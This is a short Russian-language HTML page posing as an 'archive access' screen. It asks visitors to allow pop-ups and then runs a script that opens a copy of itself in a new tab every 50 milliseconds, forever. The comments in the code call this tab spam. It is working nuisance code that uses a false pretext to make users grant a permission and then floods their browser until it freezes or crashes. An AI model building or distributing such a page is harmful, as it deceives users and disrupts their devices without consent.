<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Доступ к архиву</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 40%;
            margin: 0;
        }
        h1 {
            font-size: 2em;
            text-shadow: 0 0 10px #0f0;
        }
        p {
            font-size: 1.5em;
            color: #f00;
            text-shadow: 0 0 5px #f00;
        }
    </style>
</head>
<body>
    <h1>Доступ к архиву</h1>
    <p>Разрешите всплывающие окна, чтобы продолжить</p>

    <script>
        let permissionGranted = false;

        // Функция проверки разрешения на всплывающие окна
        function checkPermission() {
            const testWindow = window.open('', '_blank');
            if (testWindow) {
                testWindow.close(); // Закрываем тестовое окно
                permissionGranted = true;
                startSpam(); // Запускаем спам вкладок
            } else {
                // Если разрешение не дано, проверяем снова через 1 секунду
                setTimeout(checkPermission, 1000);
            }
        }

        // Функция бесконечного открытия вкладок
        function startSpam() {
            function openTab() {
                window.open(window.location.href, '_blank');
                setTimeout(openTab, 50); // Открываем новую вкладку каждые 50 мс
            }
            openTab();
        }

        // Начинаем проверку разрешения
        checkPermission();
    </script>
</body>
</html>
